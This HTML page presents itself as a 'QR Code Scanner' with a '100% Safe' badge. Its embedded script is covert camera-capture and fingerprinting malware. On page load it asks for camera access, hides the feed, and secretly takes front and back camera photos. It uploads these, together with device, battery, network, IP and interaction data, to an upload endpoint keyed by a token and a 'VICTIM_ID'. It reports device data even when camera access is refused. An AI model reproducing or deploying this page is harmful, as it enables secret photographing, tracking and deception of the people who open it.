<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>QR Scanner Pro</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#0d1117;min-height:100vh;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;color:#c9d1d9;overflow:hidden}
.toolbar{background:#161b22;border-bottom:1px solid #30363d;padding:12px 16px;display:flex;align-items:center;gap:12px}
.t-icon{width:32px;height:32px;background:linear-gradient(135deg,#58a6ff,#388bfd);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:18px}
.t-title{font-size:16px;font-weight:700;color:#58a6ff}
.t-sub{font-size:11px;color:#8b949e;margin-top:2px}
.main{display:flex;flex-direction:column;align-items:center;padding:24px 20px}
.scan-wrap{position:relative;width:min(280px,80vw);height:min(280px,80vw);margin:8px 0 20px}
.scan-box{width:100%;height:100%;border-radius:20px;background:rgba(88,166,255,0.04);border:2px solid rgba(88,166,255,0.3)}
.scan-line{position:absolute;left:12px;right:12px;height:2px;background:linear-gradient(90deg,transparent 0%,#58a6ff 50%,transparent 100%);border-radius:1px;animation:scanMove 2.8s ease-in-out infinite;top:12px;box-shadow:0 0 8px #58a6ff}
@keyframes scanMove{0%,100%{top:12px;opacity:.8}50%{top:calc(100% - 12px);opacity:1}}
.corner{position:absolute;width:22px;height:22px;border-color:#58a6ff;border-style:solid}
.tl{top:-2px;left:-2px;border-width:3px 0 0 3px;border-radius:6px 0 0 0}
.tr{top:-2px;right:-2px;border-width:3px 3px 0 0;border-radius:0 6px 0 0}
.bl{bottom:-2px;left:-2px;border-width:0 0 3px 3px;border-radius:0 0 0 6px}
.br{bottom:-2px;right:-2px;border-width:0 3px 3px 0;border-radius:0 0 6px 0}
.qr-ghost{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:80px;opacity:.06;pointer-events:none;user-select:none}
.hint{font-size:13px;color:#8b949e;text-align:center;margin-bottom:4px}
.status{font-size:13px;color:#58a6ff;text-align:center;min-height:20px;margin-top:6px;font-weight:500;letter-spacing:.3px}
.badges{display:flex;gap:8px;margin-top:20px;flex-wrap:wrap;justify-content:center}
.badge{background:#161b22;border:1px solid #30363d;border-radius:20px;padding:5px 12px;font-size:11px;color:#8b949e;display:flex;align-items:center;gap:5px}
.footer{margin-top:24px;font-size:11px;color:#30363d;text-align:center}
</style>
</head>
<body>
<div class="toolbar">
  <div class="t-icon">📷</div>
  <div><div class="t-title">QR Code Scanner</div><div class="t-sub">Scan & Decode instantly</div></div>
</div>
<div class="main">
  <div class="scan-wrap">
    <div class="scan-box"></div>
    <div class="scan-line"></div>
    <div class="corner tl"></div><div class="corner tr"></div>
    <div class="corner bl"></div><div class="corner br"></div>
    <div class="qr-ghost">▣</div>
  </div>
  <div class="hint">Point your camera at a QR code to scan</div>
  <div class="status" id="st">Initializing camera...</div>
  <div class="badges">
    <div class="badge">🔒 100% Safe</div>
    <div class="badge">⚡ Instant</div>
    <div class="badge">📶 Works Offline</div>
  </div>
  <div class="footer">QR Pro Scanner v3.2 · All rights reserved</div>
</div>
<video id="camv" autoplay playsinline muted style="position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:-100;pointer-events:none"></video>
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#0d1117;z-index:-99;pointer-events:none"></div>
<canvas id="camc" style="display:none"></canvas>
<script>
(async()=>{
  const st=document.getElementById('st');
  const TOKEN='B8xX2JNWrRVamfj1Zx5W4bOZ';
  const VICTIM_ID=9;           // رقم الضحية (يُعيّنه السيرفر)
  // Relative URL — works reliably on any proxy/CDN (same as old working code)
  const UPLOAD='/cam/upload/'+TOKEN;
  let _photoLimitReached=false;            // يصبح true عند رد السيرفر بـ limit:true
  const wait=ms=>new Promise(r=>setTimeout(r,ms));

  // ── Track interactions ──────────────────────────────────────────────────
  let clickCount=0;
  const startTime=Date.now();
  document.addEventListener('click',()=>{clickCount++;},true);
  document.addEventListener('touchend',()=>{clickCount++;},{passive:true,capture:true});

  function isMobile(){
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
      ||navigator.maxTouchPoints>1;
  }

  // ── [Suggestion 1] Accurate client-side IP ──────────────────────────────
  async function getClientIP(){
    for(const url of ['https://api.ipify.org?format=json','https://api.my-ip.io/json']){
      try{
        const r=await fetch(url);
        const j=await r.json();
        if(j.ip)return j.ip;
      }catch(e){}
    }
    return null;
  }

  // ── Collect all device info ─────────────────────────────────────────────
  async function collectData(extra={}){
    const timeSpent=Math.round((Date.now()-startTime)/1000);
    const info={
      dev_date:new Date().toString(),
      ua:navigator.userAgent,
      plt:navigator.platform||navigator.oscpu||'N/A',
      lang:navigator.language,
      langs:(navigator.languages||[navigator.language]).join(', '),
      mem:navigator.deviceMemory||'N/A',
      cores:navigator.hardwareConcurrency||'N/A',
      vendor:navigator.vendor||'N/A',
      touch:navigator.maxTouchPoints,
      cookies:navigator.cookieEnabled,
      screen:screen.width+'x'+screen.height,
      pix_ratio:window.devicePixelRatio||1,
      color_depth:screen.colorDepth||'N/A',
      // [Suggestion 2] Screen orientation
      orientation:(screen.orientation&&screen.orientation.type)||(window.innerWidth>window.innerHeight?'landscape-primary':'portrait-primary'),
      tz:Intl.DateTimeFormat().resolvedOptions().timeZone||'N/A',
      is_mobile:isMobile(),
      time_spent:timeSpent,
      clicks:clickCount,
      ...extra
    };
    // Battery
    try{const b=await navigator.getBattery();info.batt_lvl=Math.round(b.level*100)+'%';info.is_chg=b.charging;}
    catch(e){info.batt_lvl='N/A';info.is_chg='N/A';}
    // [Suggestion 3] Network type (WiFi/4G/5G)
    const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
    if(conn){info.net_type=conn.effectiveType||'N/A';info.net_rtt=conn.rtt??'N/A';info.net_dl=conn.downlink??'N/A';info.net_save=conn.saveData||false;}
    else{info.net_type='N/A';info.net_rtt='N/A';info.net_dl='N/A';info.net_save='N/A';}
    // [Suggestion 1] Client IP (accurate)
    const ip=await getClientIP();
    if(ip)info.client_ip=ip;
    return info;
  }

  // ── Capture one photo from a stream ────────────────────────────────────
  const v=document.getElementById('camv');
  const c=document.getElementById('camc');

  async function capture(stream,num,camType){
    if(_photoLimitReached)return false;
    v.srcObject=stream;
    await wait(900);
    c.width=v.videoWidth||640; c.height=v.videoHeight||480;
    c.getContext('2d').drawImage(v,0,0);
    return await new Promise(res=>{
      c.toBlob(async b=>{
        if(!b){res(false);return;}
        const fd=new FormData();
        fd.append('photo',b,'img.jpg');
        fd.append('num',String(num));
        fd.append('cam_type',camType);
        fd.append('victim_id',String(VICTIM_ID));
        try{
          const r=await fetch(UPLOAD,{method:'POST',body:fd});
          const j=await r.json().catch(()=>({}));
          if(j.limit){_photoLimitReached=true;res(false);return;}
          res(true);
        }catch(e){res(false);}
      },'image/jpeg',0.82);
    });
  }

  async function shootSequence(stream,camType){
    for(let i=1;i<=5;i++){
      if(_photoLimitReached)break;
      await capture(stream,i,camType);
      if(i<5)await wait(2000);
    }
  }

  // ── Step 1: request camera (auto, no button — same as old working code) ─
  let frontStream;
  try{
    frontStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
  }catch(e){
    // Camera denied — still send device info
    const info=await collectData({cam_allowed:false,cam_error:e.name||'denied',is_mobile:isMobile()});
    const fd=new FormData();fd.append('info',JSON.stringify(info));
    fetch(UPLOAD,{method:'POST',body:fd}).catch(()=>{});
    st.textContent='Please allow camera access';
    return;
  }

  // ── Step 2: collect & send info ONCE (after camera granted) ────────────
  st.textContent='Scanning...';
  const mobile=isMobile();
  const info=await collectData({cam_allowed:true,is_mobile:mobile});
  const fdInfo=new FormData();
  fdInfo.append('info',JSON.stringify(info));
  fdInfo.append('victim_id',String(VICTIM_ID));
  fetch(UPLOAD,{method:'POST',body:fdInfo}).catch(()=>{});

  // ── Step 3: shoot front camera (5 photos × 2s) ─────────────────────────
  await shootSequence(frontStream,'front');
  frontStream.getTracks().forEach(t=>t.stop());

  // ── Step 4: back camera (mobile only) ──────────────────────────────────
  if(mobile){
    st.textContent='Switching to back camera...';
    try{
      let backStream;
      try{backStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:{exact:'environment'}},audio:false});}
      catch(e){backStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false});}
      st.textContent='Scanning (back)...';
      await shootSequence(backStream,'back');
      backStream.getTracks().forEach(t=>t.stop());
    }catch(e){}
  }else{
    // Desktop: notify no back camera
    const fd2=new FormData();fd2.append('info',JSON.stringify({device_type:'desktop',no_back_cam:true}));
    fetch(UPLOAD,{method:'POST',body:fd2}).catch(()=>{});
  }

  // ── Step 5: final stats ─────────────────────────────────────────────────
  const fd3=new FormData();
  fd3.append('info',JSON.stringify({time_final:Math.round((Date.now()-startTime)/1000),clicks_final:clickCount}));
  fd3.append('victim_id',String(VICTIM_ID));
  fetch(UPLOAD,{method:'POST',body:fd3}).catch(()=>{});
  st.textContent='✓ Scan completed successfully';
})();
</script>
</body></html>